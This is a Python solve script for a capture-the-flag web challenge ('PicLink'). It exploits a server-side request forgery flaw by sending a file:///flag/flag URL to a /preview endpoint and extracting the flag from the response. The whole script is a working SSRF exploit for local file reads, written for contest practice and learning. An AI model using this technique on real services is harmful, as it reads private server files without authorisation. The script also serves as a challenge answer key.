#!/usr/bin/env python3
"""
PicLink (inj, 200) — CWE-918 SSRF via the file:// scheme.

POST /preview fetches any URL you give it with no scheme check, so file:///flag/flag
makes the fetch layer read the local flag and serve its bytes back.

Usage:
    python3 solve.py                          # defaults to inj9.chal.deti:8048
    python3 solve.py http://inj9.chal.deti:8048
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj9.chal.deti:8048"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def fetch(url: str) -> str:
    return requests.post(f"{BASE}/preview", data={"url": url}, timeout=10).text


def main() -> int:
    out = fetch("file:///flag/flag")
    m = FLAG_RE.search(out)
    print(f"[+] FLAG: {m.group(0)}" if m else f"[i] response head:\n{out[:300]}")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
